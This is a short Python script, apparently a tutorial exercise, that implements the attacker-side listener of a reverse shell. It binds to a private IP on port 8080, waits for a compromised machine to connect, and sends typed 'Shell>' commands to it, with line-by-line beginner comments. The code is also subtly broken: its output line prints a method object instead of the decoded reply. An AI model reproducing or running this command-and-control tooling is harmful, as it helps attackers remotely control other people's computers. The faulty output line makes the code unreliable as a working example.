import socket

def connect():
    # define a socket object
    s = socket.socket()
    # bind the socket to the IP and port we want to listen on
    s.bind(("192.168.1.161", 8080))
    # max number of connections for the queue
    s.listen(1)
    # connect
    conn, addr = s.accept()
    print ('[+] we got a connection from', addr)
    
    # while loop while we're connected
    while True:
        # Get user input and store in command
        command = input("Shell> ")
        if 'exit' in command:
            # Send message to user to exit, translate unicode to sequence of bytes using .encode()
            conn.send('exit'.encode())
            # Close the socket from server side
            conn.close()
            break
        else:
            # Any other input, send the command, encode it to bytes
            conn.send(command.encode())
            # Print the recieved output 1024 bytes max, and decode to unicode string
            print(conn.recv(1024).decode)
            
# define main
def main():
    connect()
        
# call main
main()
    